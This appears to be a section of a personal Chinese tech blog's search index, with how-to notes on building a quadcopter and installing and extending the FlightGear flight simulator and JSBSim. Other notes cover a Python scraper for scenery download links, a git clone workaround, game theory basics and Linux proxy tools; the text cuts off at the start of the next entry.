    <content type="text"><![CDATA[四轴飞行器又称四旋翼、四转子，是一种多轴飞行器，有四个旋翼来悬停、维持姿态及平飞。和固定翼飞机不同，它通过旋翼提供的推力使飞机升空。它的四个旋翼大小相同，分布位置接近对称。对于简单的设计来说，仅仅通过调整不同旋翼之间的相对速度来调节不同位置的推力，并克服每个旋翼之间的反扭力矩，就可以控制飞机维持姿态、或完成各种机动飞行。下面简单介绍四旋翼无人机的制作过程。 无人机硬件装配组装一件无人机所需配件及其连接示意图如图1所示。 图1 四旋翼无人机机硬件连接图 所需配件主要有： 机身骨架 一对正浆和一对反浆。注意浆的固定方向与电机旋转方向要一致。 遥控器及接收机 无刷电机及电调 ppm sum receiver pixhawk 1，内含安全开关和蜂鸣器 gps 锂电池 云台和摄像头（可选） telemetry无线收发装置与图传（可选） 无人机软件调试遥控器与接收机之间对码遥控器和接收机之间是配对的，使用之前必须对码，可根据遥控器的使用说明书进行操作。其连接示意图如图2所示。 图2 航模遥控器与接收机对码示意图 电子调速器的油门行程和进角设置电子调速器主要控制马达的转速，其调试连接示意图如图3所示。 图3 电子调速器连接示意图 如图3所示将电子调速器连接后，即开始设置油门行程和电子调速器进角。设置油门行程即让电子调速器知道遥控器的油门输入范围。而电子调速器进角有高中低之分，类似于汽车档位。低进角速度慢但扭力大，高进角速度快但扭力小，一般设置电子调速器中进角即可满足大多数要求。具体设置说明参照电子调速器使用说明书。 pixhawk飞控平台的设置Pixhawk是PX4飞行堆栈的标准微控制器平台。在pixhawk硬件平台上可运行PX4和ArduPilot两种不同的自动驾驶仪软件套件。如果在pixhawk平台上安装px4自驾仪软件，则使用QGroundControl地面站软件进行设置；如果在pixhawk平台上安装ArduPilot自驾仪软件，则使用MissionPlanner地面站软件进行设置。 Pixhawk和GPS按照方向捆绑好后，按照地面站软件的指示进行设置。设置好之后，长按Pixhawk的安全开关，再将遥控器油门拉动底并推向最右方，即可解锁Pixhawk。 参考链接 四轴飞行器,by wikipedia. PX4 autopilot, by px4 homepage. Crazepony开源四轴飞行器,by crazepony. ArduPilot,by wikipedia. PX4 autopilot,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear多人服务器的本地安装配置]]></title>
    <url>%2F2019%2F03%2F20%2FFlightGear%E5%A4%9A%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[FGMS或FlightGear多人游戏服务器是FlightGear的独立网络服务器，并根据GPL许可。 它允许通过FGFS内的网络与其他飞行员一起飞行。 FGMS服务器列表类型主要有： 中继服务器 - 网络中的其他服务器。 每个都必须有完整的列表（减去自己）以获得适当的网络功能。 交叉馈送服务器 - 服务器从本地用户和其他服务器接收的所有内容都将转发到交叉馈送服务器。 用于在同一主机上运行多个连接的fgms实例，例如用于提供跟踪和未跟踪服务，而不会产生额外的外部流量。 跟踪服务器 - 服务器每10秒向跟踪器发送一个每个本地用户的摘要更新。 HUB服务器 - 通常服务器不会将从服务器接收的数据包发送到其他中继。 HUB服务器将数据从服务器发送到它知道的所有中继。 特别呼号： “obsXXXX”（用您喜欢的任何字符替换X）允许连接的FlightGear客户端查看全球所有其他MP飞行员（位置数据和聊天消息），但对他们和MPmap保持不可见。 “mpdummy”阻止在FGTracker上跟踪飞行员。 不推荐 - 如果多个用户使用此呼号，服务器将忽略一些用户。 改为连接到未跟踪的服务器。 安装配置FGMS服务器下载FGMS服务器源码1git clone git://git.code.sf.net/p/fgms/src fgms-src 安装配置FGMS服务器源码123456789cd fgms-srcmkdir buildcd build cmake ..makecd ..cp contrib/etc/fgms_production.skel.conf build/fgms.cfgcd build./fgms 安装配置FGMS跟踪服务器源码下载FGMS跟踪服务器源码1git clone git://git.code.sf.net/p/fgms/fgtracker fgms-fgtracker FlightGear联网飞行配置联机前，请选择合适的服务器名（通常是mpserver0?.flightgear.org）和端口号(通常是5000)，然后按照以下方式启动FlightGear。 使用向导程序在向导程序上专门有一个联网飞行选项，只要选中选项，填入服务器名和端口号以及你的昵称就可以了，你的昵称最长可以使7个字符。同时必须确定AI models选项选中，否则无法看到别的联网飞机。 使用命令行方式基本命令如下:1234--multiplay=out,10,&lt;server&gt;,&lt;portnumber&gt;--multiplay=in,10,&lt;client&gt;,&lt;portnumber&gt;--callsign=&lt;anything&gt;--enable-ai-models 备注: 为端口号，比如5000. 为服务器名，比如mpserver01.flightgear.org. 是你的计算机名，或者是你的联网的IP地址，比如本地IP地址192.168.0.1 是你自己的昵称, 最多7个字符比如NFGFS.当程序开始运行后，你可以在服务器地图上看到自己，如果看不到，检查一下程序是否有报错信息，按照下面将要介绍的内容检查错误。 参考链接 Howto:Multiplayer,by flightgear home. FlightGear Multiplayer Server,by flightgear home.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux平台编译安装测试JSBSim]]></title>
    <url>%2F2019%2F03%2F20%2FLinux%E5%B9%B3%E5%8F%B0%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%B5%8B%E8%AF%95JSBSim%2F</url>
    <content type="text"><![CDATA[JSBSim是一个开源跨平台的飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。 它也可以从一个小型独立程序调用，以创建批处理模拟工具。 JSBSim是用C ++编写的，使用XML配置文件。下面介绍如何在Linux平台编译按照测试JSBSim。 基础知识cmake代码变成可执行文件，叫做编译（compile）；先编译这个，还是先编译那个（即编译的安排），叫做构建（build）。 Make是最常用的构建工具，诞生于1977年，主要用于C语言的项目。但是实际上 ，任何只要某个文件有变化，就要重新构建的项目，都可以用Make构建。 Make工具有很多，例如 GNU Make ，QT 的 qmake ，微软的 MS nmake，BSD Make（pmake），Makepp，等等。这些 Make 工具遵循着不同的规范和标准，所执行的 Makefile 格式也千差万别。这样就带来了一个严峻的问题：如果软件想跨平台，必须要保证能够在不同平台编译。而如果使用上面的 Make 工具，就得为每一种标准写一次 Makefile ，这将是一件让人抓狂的工作。 CMake就是针对上面问题所设计的工具：它首先允许开发者编写一种平台无关的 CMakeList.txt 文件来定制整个编译流程，然后再根据目标用户的平台进一步生成所需的本地化 Makefile 和工程文件，如 Unix 的 Makefile 或 Windows 的 Visual Studio 工程。从而做到“Write once, run everywhere”。显然，CMake 是一个比上述几种 make 更高级的编译配置工具。一些使用 CMake 作为项目架构系统的知名开源项目有 VTK、ITK、KDE、OpenCV、OSG 等。 在 linux 平台下使用 CMake 生成 Makefile 并编译的流程如下： 编写 CMake 配置文件 CMakeLists.txt 。 执行命令 cmake PATH 或者 ccmake PATH 生成 Makefile。其中， PATH 是 CMakeLists.txt 所在的目录。 使用 make 命令进行编译。 编译JSBSim下载JSBSim源代码1git clone https://github.com/JSBSim-Team/jsbsim.git 编译JSBSim123456789101112# 跳转到jsbsim源码目录cd jsbsim # 创建build文件夹用于编译jsbsimmkdir build cd build# 生成Makefile文件cmake .. # 编译make # 编译完成后跳转到jsbsim所在目录测试cd src./jsbsim 测试jsbsim1234# 跳转到jsbsim源码目录cd jsbsim # 测试jsbsim./build/src/JSBSim scripts/c1723.xml 参考链接 JSBSim, by wikipedia. Make 命令教程,by 阮一峰 CMake 入门实战,by hahack. JSBSim使用教程, by 32768.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear飞行模拟器中创建新飞机的方法]]></title>
    <url>%2F2019%2F03%2F17%2FFlightGear%E9%A3%9E%E8%A1%8C%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%AD%E5%88%9B%E5%BB%BA%E6%96%B0%E9%A3%9E%E6%9C%BA%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[FlightGear中创建新飞机粗略地分成四步：创建飞机的3D模型，创建飞机的飞行动力学模型，创建飞机操作动画，实现飞机各子系统。具体而言，又可分成两个主要的开发领域：飞行动力学模型开发和飞机3D模型开发。 飞机3D模型开发主要包括飞机外形、驾驶舱的3D模型开发，为飞行动力学模型设计的动画，声音等。 加载飞机模型通过OpenSceneGraph，FlightGear支持许多不同的3D文件格式，包括VRML1，AC3D，DXF等等。 但是，.ac是大多数FG模型中使用的标准。 主FlightGear属性树中的属性/ sim / model / path控制将加载的模型; 它需要一个字符串值，从$ FG ROOT给出模型的相对路径。 加载新模型的最简单方法是使用—prop：命令行选项在启动时设置属性; 例如，要使用已安装在$ FG_ROOT / Models / my-cessna.ac中的3D飞机模型，您可以像这样调用FlightGear（在类Unix系统下）： 1fgfs --prop:/sim/model/path=Models/my-cessna.ac （注意：通常模型使用的所有纹理必须出现在同一目录中。如果my-cessna.ac使用纹理cessna01.rgb和cessna02.rgb，你还应该在$ FG_ROOT / Models /中安装这些纹理。 如果要将3D模型永久设置为飞机的默认值而不是在命令行上指定，则需要编辑飞机设置文件。 在$ FG_ROOT / Aircraft /目录中有一系列以-set.xml结尾的文件，例如c172-set.xml，dc3-yasim-set.xml和beech99-uiuc-set.xml。 当您使用—aircraft选项启动FlightGear时，它会从其中一个文件中读取属性; 例如 1fgfs --aircraft=dc3-yasim 将$ FG_ROOT / Aircraft / dc3-yasim-set.xml中的属性加载到主FlightGear属性树中。 这些文件与$ FG_ROOT / preferences.xml和FlightGear保存文件具有相同的XML属性列表格式。 对于任何单机类型，可能有许多具有不同启动条件，声音，面板，3D模型等的XML文件，因此您最好复制现有的，重命名它，然后更改模型内部路径元素内的值SIM卡： 12345678&lt;PropertyList&gt;&lt;sim&gt; &lt;model&gt; &lt;path&gt;Models/my-cessna.ac&lt;/path&gt; &lt;texture-path&gt;./Textures&lt;/texture-path&gt; &lt;/model&gt;&lt;/sim&gt;&lt;/PropertyList&gt; 飞机动力学模型开发FlightGear主要使用JSBSim 和 YASim两个开源的飞行动力学模型，也有极少数使用UIUC飞行动力学模型。 YASimFDM是控制模拟器内飞行物理的数学模型。 物理3D飞机模型与飞行动力学无关 - 实质上它只是一张要看的图片。 这是FDM决定模型如何飞行。 为何选择YASim？ YASim使用飞机的几何形状来生成基本飞行特征。 虽然这表明了一种“现实的”或开箱即用的方法，但在获得接近现实主义的结果之前，这只是一种粗略的近似，需要进行大量的调整。 如果您的飞机有稳定的飞行数据，例如风洞数据，或者您希望最终生成超逼真的模拟，那么JSBSim可能是更好的方法。 如果你缺乏这样的数据但是知道飞机的几何形状并且能够获得与真实飞行员相同的飞行特性和限制，那么YASim可以提供足以满足大多数模拟需求的解决方案。 JSBSimJSBSim是一个开源飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。 它也可以从一个小型独立程序调用，以创建批处理模拟工具。 JSBSim自1996年以来一直在开发和使用，并且已经构建在当今使用的所有最流行的平台上，包括运行Linux，Macintosh和Microsoft Windows操作系统的平台。 JSBSim是用C ++编写的，使用XML配置文件。 飞机模型开发规范说明规则和指导 FlightGear中的所有图像的大小应为2的幂（例如64 64,128 256或16 * 1024）。大多数计算机无法处理大于4096像素的纹理。从FlightGear 1.9开始，图像不再需要以.rgb格式保存。现在.png是FlightGear开发人员中最常用的.png。 请注意，我们在代码中使用空格，一些开发人员使用相应的选项卡，以使我们的代码易于（呃）阅读。每一行开始一个新标签，我们按空格键一次，这样你就可以得到一种楼梯。只要您在所有文件中始终如一地使用它，使用何种方法并不重要。但是JSBSim FDM使用的XML文件必须使用空格而不是制表符。 在大多数操作系统上，文件名和目录区分大小写。 Windows不区分大小写，因此当您在Windows计算机上进行开发时，您不会发现任何问题。在其他操作系统上，“波音”和“波音”之间存在差异。由于FlightGear用于多个平台，请确保您的代码正确使用大写字母！ 目录结构说明创建一个新的飞机模型，应该在$FG_ROOT/Aircraft/路径下创建文件夹，以飞机名称命名。例如在$FG_ROOT/Aircraft/路径下创建一个Su30的文件夹，开始构建Su30飞机模型。在飞机根目录下，其目录结构如下： -set.xml file 描述飞机依赖关系的最重要文件是aircraft-set.xml文件。 .xml file (FDM) 该文件包含飞机的整个（或部分）飞行动力学模型。有YASim、JSBSim、UIUC三种不同的飞行动力学模型，他们都有自己的优缺点。 由于数据有限，YASim通常被认为是最好的方式。 当您访问真实的风洞数据和/或需要更多灵活性时，JSBSim可能是更好的选择。 Engines/ directory 仅适用于JSBSim飞机。 在此目录中，存储引擎和推进器/螺旋桨文件。 Models/ directory 该目录包含所有与模型相关的文件; 例如纹理，模型和动画文件（.xml）。 在-set.xml文件中，我们将路径设置为一个.xml文件。 该文件应链接（间接）到飞机所需的每个其他模型文件（包括可能的3D驾驶舱）。 整个飞机可以建模为一个文件，但大多数开发人员更喜欢拆分。 例如，驾驶舱可以由几个文件构建，每个文件只存在一个仪器或面板。 这样很容易（重新）移动飞机的某些部件。 您可以像这样设置模型文件： 1234567891011121314151617181920212223242526272829303132&lt;PropertyList&gt; &lt;path&gt;Aircraft.ac&lt;/path&gt; &lt;model&gt; &lt;name&gt;Cockpit&lt;/name&gt; &lt;path&gt;Aircraft/.../Models/cockpit.xml&lt;/path&gt; &lt;offsets&gt; &lt;x-m&gt; -5.25&lt;/x-m&gt; &lt;y-m&gt; 0.00&lt;/y-m&gt; &lt;z-m&gt; 1.30&lt;/z-m&gt; &lt;/offsets&gt; &lt;/model&gt; &lt;animation&gt; &lt;type&gt;rotate&lt;/type&gt; &lt;object-name&gt;AileronLeft&lt;/object-name&gt; &lt;property&gt;/controls/flight/aileron&lt;/property&gt; &lt;factor&gt;-65&lt;/factor&gt; &lt;center&gt; &lt;x-m&gt; 2.09&lt;/x-m&gt; &lt;y-m&gt;-5.50&lt;/y-m&gt; &lt;z-m&gt;-1.50&lt;/z-m&gt; &lt;/center&gt; &lt;axis&gt; &lt;x&gt;1&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;z&gt;0&lt;/z&gt; &lt;/axis&gt; &lt;/animation&gt; &lt;/PropertyList&gt; cockpit.xml文件可以包含相似结构，所有工具都是单独的模型。 模型的数量不受限制，动画的数量也不限。 Nasal/ directory 所有针对飞机的Nasal脚本都放在此目录中，但某些系统或仪器特定的Nasal脚本除外。 如果某个Nasal脚本对所有飞机都有用（例如天气或多人相关），它可以放在$ FG_ROOT / Nasal目录中。 可以在$ FG_ROOT / Aircraft / Generic目录中找到可在多架飞机上使用的Nasal脚本（例如空中加油）。 Sounds/ directory 声音对于增加你实际进入模拟的感觉非常重要。 在此目录中，存储了特定于飞行器的所有声音文件。 可以在多个飞机上使用的声音（例如，点击开关或雷声）可在$ FG_ROOT / Sounds目录中找到。 Tutorials/ directory FlightGears教程系统是学习如何启动飞机引擎等的有用功能。 它允许您创建一个分步教程，指导用户完成某个过程。 它甚至可以指示应按下哪些开关！ 参考链接 Howto:Make an aircraft,by flightgear home. Howto:3D Aircraft Models,by flightgear home. Howto:Animate models,by flightgear home. YASim,by flightgear home. JSBSim,by flightgear home.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FlightGear安装飞机和场景的方法]]></title>
    <url>%2F2019%2F03%2F13%2FFlightGear%E5%AE%89%E8%A3%85%E9%A3%9E%E6%9C%BA%E5%92%8C%E5%9C%BA%E6%99%AF%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[FlightGear可安装额外的飞行器和地景。 安装地景FlightGear的详细地景可以覆盖整个世界。默认的FlightGear安装包只包括旧金山周边一小块区域，因此想要飞到其他地方，得下载额外的地景。 每一块地景被打包成一个压缩包，每经纬度10度为一块。每一个压缩包以10×10经纬度命名，如w130n50.tgz。 下载FlightGear地景参考链接1。下载后的地景复制到$FG_ROOT/Scenery或者$FG_SCENERY下。 使用如下命令解压地景，将在$FG_ROOT/Scenery产生Objects和Terrain两个文件夹，分别为卫星地图和地形数据。123cd $FG_ROOT/Scenerytar -xvf e110n30.tgzrm e110n30.tgz 安装飞行器默认的FlightGear安装包只有少数几个飞行器，可以从参考链接2中获得大量的飞行器。 下载的飞行器复制到$FG_ROOT/Aircraft文件夹下。 参考链接 下载FlightGear地景， by flightgear. 下载FlightGear飞行器, by flightgear.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫获取网页链接]]></title>
    <url>%2F2019%2F03%2F13%2FPython%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96%E7%BD%91%E9%A1%B5%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[最近研究开源飞行模拟器，想将其世界地景全部下载下来。一个个手动下载太麻烦，于是想先用python的requests和Beautiful Soup组件获取地景链接，再以每行一个地景链接写入文本文档，最后使用axel多线程自动下载每一个地景包。 基础知识requests组件Requests是一个Python HTTP库，在Apache 2许可证下发布。该项目的目标是使HTTP请求更简单，更人性化。 下面是示例代码： 123456789101112&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get(&apos;https://api.github.com/user&apos;, auth=(&apos;user&apos;, &apos;pass&apos;))&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; r.headers[&apos;content-type&apos;]&apos;application/json; charset=utf8&apos;&gt;&gt;&gt; r.encoding&apos;utf-8&apos;&gt;&gt;&gt; r.text # doctest: +ELLIPSISu&apos;&#123;&quot;type&quot;:&quot;User&quot;...&apos;&gt;&gt;&gt; r.json() # doctest: +ELLIPSIS&#123;u&apos;private_gists&apos;: 419, u&apos;total_private_repos&apos;: 77, ...&#125; Beautiful Soup组件Beautiful Soup 是一个可以从HTML或XML文件中提取数据的Python库。它能够通过你喜欢的转换器实现惯用的文档导航，查找，修改文档的方式。Beautiful Soup会帮你节省数小时甚至数天的工作时间。 Beautiful Soup支持Python标准库中的HTML解析器，还支持一些第三方的解析器，其中一个是 lxml。 Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种: Tag , NavigableString , BeautifulSoup , Comment。 Tag 对象与XML或HTML原生文档中的tag相同，有最重要的属性: name和attributes。 BeautifulSoup 对象表示的是一个文档的全部内容，但并不是真正的HTML或XML的tag，所以它没有name和attribute属性。 Beautiful Soup用 NavigableString 类来包装tag中的字符串。 Comment 对象是一个特殊类型的 NavigableString 对象: 下面是BeautifulSoup的一个简单示例。 123456789101112131415161718192021222324252627282930313233343536from bs4 import BeautifulSoupsoup = BeautifulSoup(html_doc)print(soup.prettify())# &lt;html&gt;# &lt;head&gt;# &lt;title&gt;# The Dormouse&apos;s story# &lt;/title&gt;# &lt;/head&gt;# &lt;body&gt;# &lt;p class=&quot;title&quot;&gt;# &lt;b&gt;# The Dormouse&apos;s story# &lt;/b&gt;# &lt;/p&gt;# &lt;p class=&quot;story&quot;&gt;# Once upon a time there were three little sisters; and their names were# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;# Elsie# &lt;/a&gt;# ,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;# Lacie# &lt;/a&gt;# and# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link2&quot;&gt;# Tillie# &lt;/a&gt;# ; and they lived at the bottom of a well.# &lt;/p&gt;# &lt;p class=&quot;story&quot;&gt;# ...# &lt;/p&gt;# &lt;/body&gt;# &lt;/html&gt; axel工具axel是Linux下一个不错的HTTP/ftp高速下载工具。支持多线程下载、断点续传，且可以从多个地址或者从一个地址的多个连接来下载同一个文件。适合网速不给力时多线程下载提高下载速度。 axel语法：1axel [options] url1 [url2] [url...] axel选项：123456789101112--max-speed=x , -s x 最高速度x--num-connections=x , -n x 连接数x--output=f , -o f 下载为本地文件f--search[=x] , -S [x] 搜索镜像--header=x , -H x 添加头文件字符串x（指定 HTTP header）--user-agent=x , -U x 设置用户代理（指定 HTTP user agent）--no-proxy ， -N 不使用代理服务器--quiet ， -q 静默模式--verbose ，-v 更多状态信息--alternate ， -a Alternate progress indicator--help ，-h 帮助--version ，-V 版本信息 代码实现获取地景链接12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsfrom bs4 import BeautifulSoup# 下载指定URI链接def getUriContent(uri): try: fgWorldScenery = requests.get(link, timeout=10) except requests.exceptions.HTTPError as errh: print (&quot;Http Error:&quot;,errh) except requests.exceptions.ConnectionError as errc: print (&quot;Error Connecting:&quot;,errc) except requests.exceptions.Timeout as errt: print (&quot;Timeout Error:&quot;,errt) except requests.exceptions.RequestException as err: print (&quot;OOps: Something Else&quot;,err) else: print(&quot;Http Request Success!&quot;) return fgWorldScenery.text# 获取所有地景链接，存入列表def getTargetLinks(html): soup = BeautifulSoup(html) list=[] #print(soup.prettify()) for child in soup.find_all(&apos;area&apos;): list.append(child[&apos;href&apos;]) print(&quot;Get Target Links Success!&quot;) return list# 将地景链接逐行写入文件def writeToFile(linkList): file = open(&apos;./sceneLink.txt&apos;,&apos;w&apos;) for link in linkList: file.write(link) file.write(&apos;\t\n&apos;) print(&quot;Write Target Link To File Success!&quot;) file.close()if __name__ == &quot;__main__&quot;: link = &quot;http://www.flightgear.org/legacy-Downloads/scenery-v2.12.html&quot; html=getUriContent(link) linkList=getTargetLinks(html) writeToFile(linkList) 下载世界地景1234for line in $(cat sceneLink.txt)do axel -n 10 $linedone 参考链接 requests快速上手,by requests. Python 基础教程, by runoob. Python之父教你写main()函数,by 编程派. Beautiful Soup 4.2.0 文档,by BeautifulSoup. FlightGear安装飞机和场景的方法,by jack huang. axel命令,by Linux命令大全.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git_Clone大项目超过1G失败解决方案]]></title>
    <url>%2F2019%2F03%2F09%2FGit-Clone%E5%A4%A7%E9%A1%B9%E7%9B%AE%E8%B6%85%E8%BF%871G%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[SourceForge.net，又称SF.net，是开源软件的开发者进行开发管理的集中式场所，也是全球最大开源软件开发平台和仓库。FlightGear的源代码就托管在该平台。最近在使用Git克隆FlightGear的子项目fgdata时，老是到1G时失败。具体情况如下： 123456789# git clone fgdata大项目时超过1G就会出错$ git clone https://git.code.sf.net/p/flightgear/fgdataCloning into &apos;fgdata&apos;...remote: Counting objects: 61455, done.remote: Compressing objects: 100% (27321/27321), done.error: RPC failed; curl 56 GnuTLS recv error (-110): The TLS connection was non-properly terminated.fatal: The remote end hung up unexpectedlyfatal: early EOFfatal: index-pack failed 经多种方案尝试，使用如下方法可避免该问题：1$ git clone git://git.code.sf.net/p/flightgear/fgdata 参考链接 FGdata downloading error,by flightgear forum. SourceForge Support,by sourceforge. git clone 太慢怎么办？, by aneasystone.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flightgear在Linux/Debian中的下载编译安装教程]]></title>
    <url>%2F2019%2F03%2F08%2FFlightgear%E5%9C%A8Linux-Debian%E4%B8%AD%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[编译安装使用如下脚本在Linux/Debian操作系统下从源代码构建开源飞行模拟器FlightGear.123456789cd &lt;your working directory for building FlightGear&gt;wget -O download_and_compile.sh http://sourceforge.net/p/flightgear/fgmeta/ci/next/tree/download_and_compile.sh?format=rawchmod +x download_and_compile.shmkdir -p stablemkdir -p nextcd stable../download_and_compile.sh -scd ../next../download_and_compile.sh -p n 需要注意的是，该脚本git clone fgdata时超过1G时就会报错退出，解决方案见链接4。 此外，如果之前安装过FlightGear的旧版本，编译过程也有可能报错，清理之前旧版本之后即可解决问题。 启动模拟器启动FlightGear命令如下：123cd &lt;your working directory for building FlightGear&gt;cd stable./run_fgfs.sh fgfs常用选项fgfs为flightgear的飞行模拟器主程序，在命令行中输入fgfs —launcher即可打开启动器，选择飞机、位置等配置，然后开始模拟飞行。下面介绍fgfs的一些常用选项。 —launcher 打开启动器。 —fg-root=path 告诉flightgear到path下寻找数据文件，如飞机、地景等。 —fg-scenery=path 告诉flightgear到path下寻找地景文件。 —fg-aircraft=path 告诉flightgear到path下寻找飞机文件。 —language=code 指定会话语音， 例如 pl, nl, it, fr, en, de。 —aircraft= 飞行器 载入特定飞行器。 —show-aircraft 打印可用的飞行器列表。 参考链接 Howto:Get Local Copies of Flightgear Source Code,by flightgear wiki. Scripted Compilation on Linux Debian/Ubuntu, by flightgear wiki. Building FlightGear,by flightgear wiki. Git_Clone大项目超过1G失败解决方案 ,by jack huang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博弈论简介]]></title>
    <url>%2F2019%2F02%2F26%2F%E5%8D%9A%E5%BC%88%E8%AE%BA%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[博弈论（英语：game theory），又译为对策论，经济学的一个分支，1944年冯·诺伊曼与奥斯卡·摩根斯特恩合著《博弈论与经济行为》，标志着现代系统博弈理论的的初步形成，因此他被称为“博弈论之父”。博弈论被认为是20世纪经济学最伟大的成果之一。目前在生物学、经济学、国际关系、计算机科学、政治学、军事战略和其他很多学科都有广泛的应用。 概述博弈论考虑游戏中的个体的预测行为和实际行为，并研究它们的优化策略。表面上不同的相互作用可能表现出相似的激励结构（incentive structure），所以它们是同一个游戏的特例。其中一个有名有趣的应用例子是囚徒困境。 具有竞争或对抗性质的行为称为博弈行为。在这类行为中，参加斗争或竞争的各方各自具有不同的目标或利益。为了达到各自的目标和利益，各方必须考虑对手的各种可能的行动方案，并力图选取对自己最为有利或最为合理的方案。比如日常生活中的下棋，打牌等。博弈论就是研究博弈行为中斗争各方是否存在着最合理的行为方案，以及如何找到这个合理的行为方案的数学理论和方法。 分类 图1 博弈论知识结构 术语 局中人（players）：在一场竞赛或博弈中，每一个有决策权的参与者成为一个局中人。只有两个局中人的博弈现象称为“两人博弈”，而多于两个局中人的博弈称为 “多人博弈”。 策略（strategies）：一局博弈中，每个局中人都有选择实际可行的完整的行动方案，即方案不是某阶段的行动方案，而是指导整个行动的一个方案，一个局中人的一个可行的自始至终全局筹划的一个行动方案，称为这个局中人的一个策略。如果在一个博弈中局中人都总共有有限个策略，则称为“有限博弈”，否则称为“无限博弈”。 得失（payoffs）：一局博弈结局时的结果称为得失。每个局中人在一局博弈结束时的得失，不仅与该局中人自身所选择的策略有关，而且与全局中人所取定的一组策略有关。所以，一局博弈结束时每个局中人的“得失”是全体局中人所取定的一组策略的函数，通常称为支付（payoff）函数。 次序（orders）：各博弈方的决策有先后之分，且一个博弈方要作不止一次的决策选择，就出现了次序问题；其他要素相同次序不同，博弈就不同。 博弈涉及到均衡：均衡是平衡的意思，在经济学中，均衡意即相关量处于稳定值。在供求关系中，某一商品市场如果在某一价格下，想以此价格买此商品的人均能买到，而想卖的人均能卖出，此时我们就说，该商品的供求达到了均衡。所谓纳什均衡，它是一稳定的博弈结果。 参考链接 博弈论,by wikipedia. 博弈论, by 智库百科.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>博弈论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux代理工具简介]]></title>
    <url>%2F2019%2F02%2F23%2FLinux%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[下面介绍两个Linux代理工具shadowsock和proxychains。 shadowsockShadowsocks可以指一种基于Socks5代理方式的加密传输协议，也可以指实现这个协议的各种开发包。当前包使用Python、C、C++、C#、Go语言等编程语言开发，大部分主要实现（iOS平台的除外）采用Apache许可证、GPL、MIT许可证等多种自由软件许可协议开放源代码。Shadowsocks分为服务器端和客户端，在使用之前，需要先将服务器端部署到服务器上面，然后通过客户端连接并创建本地代理。 1234# 安装方法sudo apt-get install shadowsocks# 使用方法nohup /usr/bin/sslocal -c /etc/shadowsocks/server.json proxychainsProxyChains是一个开源代理工具，能够强制使任何应用的TCP连接使用SOCKS4,SOCKS或者HTTP(S)代理进行连接。 12345678# 安装配置sudo apt install proxychainssudo gedit /etc/proxychains.confsocks5 127.0.0.1 1080# 使用方法proxychains firefoxtproxychains aria2cproxychains wget 参考链接 Shadowsocks,by wikipedia. SOCKS,by wikipedia. 将 Tor socks 转换成 http 代理,by linux 中国.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式系统的CAP理论简介]]></title>
    <url>%2F2019%2F02%2F17%2F%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E7%9A%84CAP%E7%90%86%E8%AE%BA%E7%AE%80%E4%BB%8B%2F</url>
